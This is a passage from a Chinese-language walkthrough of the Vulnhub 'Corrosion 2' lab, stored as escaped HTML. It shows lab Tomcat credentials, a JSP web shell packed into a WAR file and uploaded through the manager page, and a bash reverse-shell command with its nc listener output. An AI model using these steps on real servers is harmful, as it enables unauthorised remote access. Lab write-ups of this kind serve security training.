name=\u003cspan class=\"hljs-string\"\u003e\"admin-gui\"\u003c/span\u003e/\u003e\n\u0026#x3C;user username=\u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e password=\u003cspan class=\"hljs-string\"\u003e\"melehifokivai\"\u003c/span\u003e roles=\u003cspan class=\"hljs-string\"\u003e\"admin-gui, manager-gui\"\u003c/span\u003e/\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e的到密码\u003ccode\u003emelehifokivai\u003c/code\u003e ，两个用户名\u003ccode\u003eadmin\u003c/code\u003e和\u003ccode\u003emanager\u003c/code\u003e ，均尝试了\u003ccode\u003essh\u003c/code\u003e登录无果\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003e/manager\u003c/code\u003e 提交得到的账号密码，成功进入使用了\u003ccode\u003eadmin\u003c/code\u003e和\u003ccode\u003emelehifokivai\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image90.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e进入了\u003ccode\u003etomcat\u003c/code\u003e的后台，涉及到\u003ccode\u003etomcat\u003c/code\u003e后台的利用\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/weixin_41924764/article/details/108196725\"\u003ehttps://blog.csdn.net/weixin_41924764/article/details/108196725\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/qq_43615820/article/details/116357744\"\u003ehttps://blog.csdn.net/qq_43615820/article/details/116357744\u003c/a\u003e 这里使用的是JSP的一句话木马\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e复制恶意代码存为文件\u003ccode\u003e2131.jsp\u003c/code\u003e ，并使用\u003ccode\u003ejar\u003c/code\u003e制作\u003ccode\u003ewar\u003c/code\u003e包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejar cvf \u003cspan class=\"hljs-number\"\u003e2131.\u003c/span\u003ewar \u003cspan class=\"hljs-number\"\u003e2131.j\u003c/span\u003esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后上传\u003ccode\u003ewar\u003c/code\u003e包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image91.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传之后使用蚁🗡连接，测试成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image92.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用蚁🗡虚拟终端进行反弹\u003ccode\u003eshell\u003c/code\u003e ，同时\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(tomcat:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sh: ) $ bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.10/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                             \nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e58882\u003c/span\u003e\nbash: cannot \u003cspan class
